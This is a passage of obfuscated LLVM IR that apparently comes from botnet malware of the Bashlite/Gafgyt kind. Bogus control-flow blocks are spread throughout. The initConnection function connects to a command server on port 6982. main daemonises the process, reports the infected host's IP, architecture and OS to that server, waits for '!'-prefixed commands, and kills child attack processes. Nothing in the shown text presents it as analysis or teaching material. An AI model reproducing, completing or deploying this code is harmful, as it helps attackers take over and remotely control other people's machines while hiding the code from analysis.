  %1607 = icmp ne i32 %1606, 0
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1283
  %1608 = load i8**, i8*** %12, align 8
  %1609 = getelementptr inbounds i8*, i8** %1608, i64 0
  %1610 = load i8*, i8** %1609, align 8
  %1611 = call i32 @strcmp(i8* %1610, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0)) #10
  %1612 = icmp ne i32 %1611, 0
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1305
  store i32 0, i32* %44, align 4
  store i64 0, i64* %45, align 8
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1326
  %1613 = load i32*, i32** @pids, align 8
  %1614 = load i64, i64* %45, align 8
  %1615 = getelementptr inbounds i32, i32* %1613, i64 %1614
  %1616 = load i32, i32* %1615, align 4
  %1617 = icmp ne i32 %1616, 0
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1355
  %1618 = load i32*, i32** @pids, align 8
  %1619 = load i64, i64* %45, align 8
  %1620 = getelementptr inbounds i32, i32* %1618, i64 %1619
  %1621 = load i32, i32* %1620, align 4
  %1622 = call i32 @kill(i32 %1621, i32 9) #6
  %1623 = load i32, i32* %44, align 4
  %_ = sub i32 0, %1623
  %gen = add i32 %_, 1
  %_187 = sub i32 0, %1623
  %gen188 = add i32 %_187, 1
  %_189 = sub i32 %1623, 1
  %gen190 = mul i32 %_189, 1
  %_191 = shl i32 %1623, 1
  %_192 = sub i32 0, %1623
  %gen193 = add i32 %_192, 1
  %_194 = sub i32 0, %1623
  %gen195 = add i32 %_194, 1
  %_196 = sub i32 0, %1623
  %gen197 = add i32 %_196, 1
  %1624 = add nsw i32 %1623, 1
  store i32 %1624, i32* %44, align 4
  br label %originalBB186

originalBB201alteredBB:                           ; preds = %originalBB201, %1380
  %1625 = load i64, i64* %45, align 8
  %_202 = sub i64 0, %1625
  %gen203 = add i64 %_202, 1
  %_204 = sub i64 0, %1625
  %gen205 = add i64 %_204, 1
  %_206 = sub i64 0, %1625
  %gen207 = add i64 %_206, 1
  %_208 = shl i64 %1625, 1
  %1626 = add i64 %1625, 1
  store i64 %1626, i64* %45, align 8
  br label %originalBB201

originalBB212alteredBB:                           ; preds = %originalBB212, %1403
  br label %originalBB212
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #5

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %26

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @x.55
  %9 = load i32, i32* @y.56
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* @mainCommSock, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* @mainCommSock, align 4
  %18 = load i32, i32* @x.55
  %19 = load i32, i32* @y.56
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %0
  %27 = load i32, i32* @currentServer, align 4
  %28 = add nsw i32 %27, 1
  %29 = sext i32 %28 to i64
  %30 = icmp eq i64 %29, 1
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %26
  store i32 0, i32* @currentServer, align 4
  br label %35

; <label>:32:                                     ; preds = %26
  %33 = load i32, i32* @currentServer, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* @currentServer, align 4
  br label %35

; <label>:35:                                     ; preds = %32, %31
  %36 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %37 = load i32, i32* @currentServer, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = call i8* @strcpy(i8* %36, i8* %40) #6
  store i32 6982, i32* %3, align 4
  %42 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %43 = call i8* @strchr(i8* %42, i32 58) #10
  %44 = icmp ne i8* %43, null
  br i1 %44, label %45, label %52

; <label>:45:                                     ; preds = %35
  %46 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %47 = call i8* @strchr(i8* %46, i32 58) #10
  %48 = getelementptr inbounds i8, i8* %47, i64 1
  %49 = call i32 @atoi(i8* %48) #10
  store i32 %49, i32* %3, align 4
  %50 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %51 = call i8* @strchr(i8* %50, i32 58) #10
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %45, %35
  %53 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %53, i32* @mainCommSock, align 4
  %54 = load i32, i32* @mainCommSock, align 4
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %56 = load i32, i32* %3, align 4
  %57 = call i32 @connectTimeout(i32 %54, i8* %55, i32 %56, i32 30)
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %76, label %59

; <label>:59:                                     ; preds = %52
  %60 = load i32, i32* @x.55
  %61 = load i32, i32* @y.56
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %59
  store i32 1, i32* %1, align 4
  %68 = load i32, i32* @x.55
  %69 = load i32, i32* @y.56
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %77

; <label>:76:                                     ; preds = %52
  store i32 0, i32* %1, align 4
  br label %77

; <label>:77:                                     ; preds = %76, %originalBBpart24
  %78 = load i32, i32* @x.55
  %79 = load i32, i32* @y.56
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %77
  %86 = load i32, i32* %1, align 4
  %87 = load i32, i32* @x.55
  %88 = load i32, i32* @y.56
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %86

originalBBalteredBB:                              ; preds = %originalBB, %7
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i32 @close(i32 %95)
  store i32 0, i32* @mainCommSock, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %59
  store i32 1, i32* %1, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %77
  %97 = load i32, i32* %1, align 4
  br label %originalBB6
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [4096 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca [10 x i8*], align 16
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = call i32 @getpid() #6
  %24 = xor i32 %22, %23
  call void @srand(i32 %24) #6
  %25 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %26 = call i32 @getpid() #6
  %27 = xor i32 %25, %26
  call void @init_rand(i32 %27)
  %28 = call i32 @getOurIP()
  %29 = call i32 @fork() #6
  store i32 %29, i32* %6, align 4
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %34

; <label>:31:                                     ; preds = %2
  %32 = load i32, i32* %6, align 4
  %33 = call i32 @waitpid(i32 %32, i32* %8, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:34:                                     ; preds = %2
  %35 = load i32, i32* %6, align 4
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %96, label %37

; <label>:37:                                     ; preds = %34
  %38 = load i32, i32* @x.57
  %39 = load i32, i32* @y.58
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = call i32 @fork() #6
  store i32 %46, i32* %7, align 4
  %47 = icmp ne i32 %46, 0
  %48 = load i32, i32* @x.57
  %49 = load i32, i32* @y.58
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %47, label %56, label %57

; <label>:56:                                     ; preds = %originalBBpart2
  call void @exit(i32 0) #12
  unreachable

; <label>:57:                                     ; preds = %originalBBpart2
  %58 = load i32, i32* @x.57
  %59 = load i32, i32* @y.58
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %57
  %66 = load i32, i32* %7, align 4
  %67 = icmp ne i32 %66, 0
  %68 = load i32, i32* @x.57
  %69 = load i32, i32* @y.58
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %67, label %77, label %76

; <label>:76:                                     ; preds = %originalBBpart24
  br label %78

; <label>:77:                                     ; preds = %originalBBpart24
  br label %78

; <label>:78:                                     ; preds = %77, %76
  %79 = load i32, i32* @x.57
  %80 = load i32, i32* @y.58
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %78
  %87 = load i32, i32* @x.57
  %88 = load i32, i32* @y.58
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %95

; <label>:95:                                     ; preds = %originalBBpart28
  br label %113

; <label>:96:                                     ; preds = %34
  %97 = load i32, i32* @x.57
  %98 = load i32, i32* @y.58
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %96
  %105 = load i32, i32* @x.57
  %106 = load i32, i32* @y.58
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %113

; <label>:113:                                    ; preds = %originalBBpart212, %95
  %114 = load i32, i32* @x.57
  %115 = load i32, i32* @y.58
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %113
  %122 = load i32, i32* @x.57
  %123 = load i32, i32* @y.58
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %130

; <label>:130:                                    ; preds = %originalBBpart216
  %131 = call i32 @setsid() #6
  %132 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #6
  %133 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #6
  br label %134

; <label>:134:                                    ; preds = %711, %137, %130
  %135 = call i32 @initConnection()
  %136 = icmp ne i32 %135, 0
  br i1 %136, label %137, label %139

; <label>:137:                                    ; preds = %134
  %138 = call i32 @sleep(i32 5)
  br label %134

; <label>:139:                                    ; preds = %134
  %140 = load i32, i32* @x.57
  %141 = load i32, i32* @y.58
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %139
  %148 = load i32, i32* @mainCommSock, align 4
  %149 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %150 = call i8* @inet_ntoa(i32 %149) #6
  %151 = call i8* @getPortz()
  %152 = call i8* @getBuildz()
  %153 = call i8* @getArch()
  %154 = call i8* @getOS()
  %155 = call i32 (i32, i8*, ...) @sockprintf(i32 %148, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.39, i32 0, i32 0), i8* %150, i8* %151, i8* %152, i8* %153, i8* %154)
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %156 = load i32, i32* @x.57
  %157 = load i32, i32* @y.58
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %164

; <label>:164:                                    ; preds = %originalBBpart2115, %originalBBpart275, %originalBBpart220
  %165 = load i32, i32* @x.57
  %166 = load i32, i32* @y.58
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %164
  %173 = load i32, i32* @mainCommSock, align 4
  %174 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %175 = call i32 @recvLine(i32 %173, i8* %174, i32 4096)
  store i32 %175, i32* %10, align 4
  %176 = icmp ne i32 %175, -1
  %177 = load i32, i32* @x.57
  %178 = load i32, i32* @y.58
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %176, label %185, label %711

; <label>:185:                                    ; preds = %originalBBpart224
  store i32 0, i32* %11, align 4
  br label %186

; <label>:186:                                    ; preds = %originalBBpart263, %185
  %187 = load i32, i32* @x.57
  %188 = load i32, i32* @y.58
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %186
  %195 = load i32, i32* %11, align 4
  %196 = sext i32 %195 to i64
  %197 = load i64, i64* @numpids, align 8
  %198 = icmp ult i64 %196, %197
  %199 = load i32, i32* @x.57
  %200 = load i32, i32* @y.58
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %198, label %207, label %356

; <label>:207:                                    ; preds = %originalBBpart228
  %208 = load i32, i32* @x.57
  %209 = load i32, i32* @y.58
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %207
  %216 = load i32*, i32** @pids, align 8
  %217 = load i32, i32* %11, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds i32, i32* %216, i64 %218
  %220 = load i32, i32* %219, align 4
  %221 = call i32 @waitpid(i32 %220, i32* null, i32 1)
  %222 = icmp sgt i32 %221, 0
  %223 = load i32, i32* @x.57
  %224 = load i32, i32* @y.58
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %222, label %231, label %336

; <label>:231:                                    ; preds = %originalBBpart232
  %232 = load i32, i32* @x.57
  %233 = load i32, i32* @y.58
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %231
  %240 = load i32, i32* %11, align 4
  %241 = add nsw i32 %240, 1
  store i32 %241, i32* %13, align 4
  %242 = load i32, i32* @x.57
  %243 = load i32, i32* @y.58
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBBpart239, label %originalBB34alteredBB

originalBBpart239:                                ; preds = %originalBB34
  br label %250

; <label>:250:                                    ; preds = %282, %originalBBpart239
  %251 = load i32, i32* @x.57
  %252 = load i32, i32* @y.58
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %250
  %259 = load i32, i32* %13, align 4
  %260 = zext i32 %259 to i64
  %261 = load i64, i64* @numpids, align 8
  %262 = icmp ult i64 %260, %261
  %263 = load i32, i32* @x.57
  %264 = load i32, i32* @y.58
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %262, label %271, label %285

; <label>:271:                                    ; preds = %originalBBpart243
  %272 = load i32*, i32** @pids, align 8
  %273 = load i32, i32* %13, align 4
  %274 = zext i32 %273 to i64
  %275 = getelementptr inbounds i32, i32* %272, i64 %274
  %276 = load i32, i32* %275, align 4
  %277 = load i32*, i32** @pids, align 8
  %278 = load i32, i32* %13, align 4
  %279 = sub i32 %278, 1
  %280 = zext i32 %279 to i64
  %281 = getelementptr inbounds i32, i32* %277, i64 %280
  store i32 %276, i32* %281, align 4
  br label %282

; <label>:282:                                    ; preds = %271
  %283 = load i32, i32* %13, align 4
  %284 = add i32 %283, 1
  store i32 %284, i32* %13, align 4
  br label %250

; <label>:285:                                    ; preds = %originalBBpart243
  %286 = load i32*, i32** @pids, align 8
  %287 = load i32, i32* %13, align 4
  %288 = sub i32 %287, 1
  %289 = zext i32 %288 to i64
  %290 = getelementptr inbounds i32, i32* %286, i64 %289
  store i32 0, i32* %290, align 4
  %291 = load i64, i64* @numpids, align 8
  %292 = add i64 %291, -1
  store i64 %292, i64* @numpids, align 8
  %293 = load i64, i64* @numpids, align 8
  %294 = add i64 %293, 1
  %295 = mul i64 %294, 4
  %296 = call noalias i8* @malloc(i64 %295) #6
  %297 = bitcast i8* %296 to i32*
  store i32* %297, i32** %12, align 8
  store i32 0, i32* %13, align 4
  br label %298

; <label>:298:                                    ; preds = %329, %285
  %299 = load i32, i32* @x.57
  %300 = load i32, i32* @y.58
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %298
  %307 = load i32, i32* %13, align 4
  %308 = zext i32 %307 to i64
  %309 = load i64, i64* @numpids, align 8
  %310 = icmp ult i64 %308, %309
  %311 = load i32, i32* @x.57
  %312 = load i32, i32* @y.58
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %310, label %319, label %332

; <label>:319:                                    ; preds = %originalBBpart247
  %320 = load i32*, i32** @pids, align 8
  %321 = load i32, i32* %13, align 4
  %322 = zext i32 %321 to i64
  %323 = getelementptr inbounds i32, i32* %320, i64 %322
  %324 = load i32, i32* %323, align 4
  %325 = load i32*, i32** %12, align 8
  %326 = load i32, i32* %13, align 4
  %327 = zext i32 %326 to i64
  %328 = getelementptr inbounds i32, i32* %325, i64 %327
  store i32 %324, i32* %328, align 4
  br label %329

; <label>:329:                                    ; preds = %319
  %330 = load i32, i32* %13, align 4
  %331 = add i32 %330, 1
  store i32 %331, i32* %13, align 4
  br label %298

; <label>:332:                                    ; preds = %originalBBpart247
  %333 = load i32*, i32** @pids, align 8
  %334 = bitcast i32* %333 to i8*
  call void @free(i8* %334) #6
  %335 = load i32*, i32** %12, align 8
  store i32* %335, i32** @pids, align 8
  br label %336

; <label>:336:                                    ; preds = %332, %originalBBpart232
  br label %337

; <label>:337:                                    ; preds = %336
  %338 = load i32, i32* @x.57
  %339 = load i32, i32* @y.58
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %337
  %346 = load i32, i32* %11, align 4
  %347 = add nsw i32 %346, 1
  store i32 %347, i32* %11, align 4
  %348 = load i32, i32* @x.57
  %349 = load i32, i32* @y.58
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBBpart263, label %originalBB49alteredBB

originalBBpart263:                                ; preds = %originalBB49
  br label %186

; <label>:356:                                    ; preds = %originalBBpart228
  %357 = load i32, i32* @x.57
  %358 = load i32, i32* @y.58
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %356
  %365 = load i32, i32* %10, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %366
  store i8 0, i8* %367, align 1
  %368 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  call void @trim(i8* %368)
  %369 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  store i8* %369, i8** %14, align 8
  %370 = load i8*, i8** %14, align 8
  %371 = load i8, i8* %370, align 1
  %372 = zext i8 %371 to i32
  %373 = icmp eq i32 %372, 33
  %374 = load i32, i32* @x.57
  %375 = load i32, i32* @y.58
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %373, label %382, label %694

; <label>:382:                                    ; preds = %originalBBpart267
  %383 = load i8*, i8** %14, align 8
  %384 = getelementptr inbounds i8, i8* %383, i64 1
  store i8* %384, i8** %15, align 8
  br label %385

; <label>:385:                                    ; preds = %originalBBpart271, %382
  %386 = load i8*, i8** %15, align 8
  %387 = load i8, i8* %386, align 1
  %388 = zext i8 %387 to i32
  %389 = icmp ne i32 %388, 32
  br i1 %389, label %390, label %395

; <label>:390:                                    ; preds = %385
  %391 = load i8*, i8** %15, align 8
  %392 = load i8, i8* %391, align 1
  %393 = zext i8 %392 to i32
  %394 = icmp ne i32 %393, 0
  br label %395

; <label>:395:                                    ; preds = %390, %385
  %396 = phi i1 [ false, %385 ], [ %394, %390 ]
  br i1 %396, label %397, label %416

; <label>:397:                                    ; preds = %395
  %398 = load i32, i32* @x.57
  %399 = load i32, i32* @y.58
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %397
  %406 = load i8*, i8** %15, align 8
  %407 = getelementptr inbounds i8, i8* %406, i32 1
  store i8* %407, i8** %15, align 8
  %408 = load i32, i32* @x.57
  %409 = load i32, i32* @y.58
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %385

; <label>:416:                                    ; preds = %395
  %417 = load i8*, i8** %15, align 8
  %418 = load i8, i8* %417, align 1
  %419 = zext i8 %418 to i32
  %420 = icmp eq i32 %419, 0
  br i1 %420, label %421, label %438

; <label>:421:                                    ; preds = %416
  %422 = load i32, i32* @x.57
  %423 = load i32, i32* @y.58
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %421
  %430 = load i32, i32* @x.57
  %431 = load i32, i32* @y.58
  %432 = sub i32 %430, 1
